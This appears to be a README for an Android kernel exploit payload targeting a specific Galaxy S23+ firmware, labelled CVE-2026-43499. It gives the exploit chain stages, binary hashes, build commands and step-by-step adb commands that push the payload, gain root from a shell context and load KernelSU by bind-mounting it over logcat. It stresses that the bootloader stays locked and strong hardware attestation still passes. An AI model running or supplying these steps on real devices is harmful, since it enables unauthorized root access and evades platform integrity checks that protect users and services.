# Galaxy S23+ SM-S916U1 (S916U1UES8FZG1) payload

Hardware-verified payload for the **US carrier-unlocked Galaxy S23+** (`SM-S916U1`)
on firmware `S916U1UES8FZG1`
(`samsung/dm2quew/dm2q:16/BP4A.251205.006/S916U1UES8FZG1:user/release-keys`),
kernel `5.15.189-android13-8-33413713-abS916U1UES8FZG1`.

## Hardware evidence

The full chain completed on real hardware from an `adb shell` context
(`uid=2000`, `u:r:shell:s0`), with SELinux enforcing throughout:

- tracefs KASLR discovery (`slide=0x0000000000080000`, `base=0xffffffc008080000`)
- controlled 32-object `mm_struct` collection
- shaped order-3 SKB reclaim
- MCAST waiter writer
- fake ashmem fops
- configfs arbitrary read/write
- pipe physical read/write
- root usermode helper

The run reported `done=1 root=1 uid=2000->0` and
`pipe-physrw-summary pid=... done=1 root=1 kaslr=1`.

KernelSU was loaded immediately after via the lazy-load / mount-bind path
(`mount --bind ksud /system/bin/logcat && exec -a logcat ksud late-load`).
Post-load verification:

```
$ su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
```

with SELinux enforcing (`getenforce` → `Enforcing`), Knox `warranty_bit=0`
(`ro.boot.warranty_bit=0`), and locked bootloader (`ro.boot.flash.locked=1`,
`ro.boot.vbmeta.device_state=locked`).  `MEETS_STRONG_INTEGRITY` passes on
hardware-backed attestation without any certificate spoofing.

## Files

| File | SHA-256 |
| --- | --- |
| `cve-2026-43499-app.so` | `64f7223d62fd467c7226b2b106a6875416b5427affd27fab505fb86130aed878` |
| `cve-2026-43499-root` | `690fcfaf3f423a0bd1431b8796185260afc0f630c0cc98c27686e871d4133e67` |
| `../../kernelsu/ksud-dm2q-S916U1UES8FZG1-kdp` | `5da5818d36da2d589496f91016078a43f50489e5c98b319db4eaa5ee475b86bd` |

`cve-2026-43499-app.so` is the exact binary that completed the chain on
hardware. It is built from this tree with
`make TARGET=dm2q-S916U1UES8FZG1 SLIDE_STACK_WRITER=1` (Android NDK r29),
selecting the MCAST stack writer (`-DSLIDE_STACK_WRITER=1`).

The KernelSU loader is the same `ksud-s25u-kdp` binary already present in
this repo (`android15-6.6_kernelsu-s25u-kdp.ko` family), hardware-verified
on this SM-S916U1 FZG1 device: `su -c id` returns `uid=0(root)
context=u:r:ksu:s0` under SELinux enforcing.

## Device profile

| Property | Value |
| --- | --- |
| Model | SM-S916U1 (Galaxy S23+, US carrier-unlocked / Snapdragon) |
| Codename | `dm2q` |
| SoC | Qualcomm SM8550 (Snapdragon 8 Gen 2) |
| Firmware | `S916U1UES8FZG1` |
| Android | 16 / One UI 8.5 |
| Kernel | `5.15.189-android13-8-33413713-abS916U1UES8FZG1` |
| Build fingerprint | `samsung/dm2quew/dm2q:16/BP4A.251205.006/S916U1UES8FZG1:user/release-keys` |
| KASLR slide (observed) | `0x0000000000080000` |
| Kernel base (observed) | `0xffffffc008080000` |
| KASLR source | `tracefs` |

## Build

```sh
make TARGET=dm2q-S916U1UES8FZG1 ANDROID_NDK_HOME=/path/to/android-ndk-r29
```

The Makefile already sets `-DSLIDE_STACK_WRITER=1` for this target.

## ADB shell test

Wait about one minute after boot, then push the payloads:

```sh
adb push cve-2026-43499-app.so /data/local/tmp/dm2q-u1.so
adb push cve-2026-43499-root /data/local/tmp/cve-2026-43499-root
adb push ksud-dm2q-S916U1UES8FZG1-kdp /data/local/tmp/ksud-s25u-kdp
adb shell "chmod 755 /data/local/tmp/cve-2026-43499-root /data/local/tmp/ksud-s25u-kdp"
```

Run one exploit attempt:

```sh
adb shell "SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=1 \
  P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 \
  /data/local/tmp/cve-2026-43499-root \
  --run-payload /data/local/tmp/dm2q-u1.so \
  /data/local/tmp/cve-2026-43499-root \
  /data/local/tmp/exploit.log; echo EXIT_CODE:$?"
```

On success (`done=1 root=1`), late-load KernelSU:

```sh
adb shell "/data/local/tmp/cve-2026-43499-root -c \
  'cp /data/local/tmp/ksud-s25u-kdp /data/local/tmp/.ksud-stage; \
   chmod 755 /data/local/tmp/.ksud-stage; mkdir -p /data/adb; \
   unshare -m sh -c \"mount --bind /data/local/tmp/ksud-s25u-kdp \
   /system/bin/logcat && exec -a logcat /system/bin/logcat late-load\"'"
```

Bring up KernelSU and restart Zygote:

```sh
adb shell "su -c 'ksud post-fs-data && ksud services && setprop ctl.restart zygote'"
```

Verify:

```sh
adb shell "su -c 'id; getenforce'"
# Expected: uid=0(root) ... context=u:r:ksu:s0
#           Enforcing
```

## Notes

- Run **one attempt per boot** only. A failed attempt after the stack-writer
  stage fires may leave PI state behind; reboot and retry if needed.
- Root and KernelSU are volatile — both are gone after the next reboot.
- This profile was proven exclusively from an `adb shell` / `uid=2000`
  context. A Shizuku-launched APK process cannot use the required tracefs
  path without a shell relay.
- The SIGRETURN stack writer has **not** been tested on this target. The
  proven path is MCAST only.
- The locked bootloader and Knox 0x0 state are preserved end-to-end; no
  eFuses are blown and hardware attestation remains intact.

## Authorship

Source headers (`target.h`, `p0_fingerprint.h`) derived from kernel symbol
extraction against the live `5.15.189-android13-8-33413713-abS916U1UES8FZG1`
image. Binary artifacts and hardware execution logs provided by `@rainylunanight`.
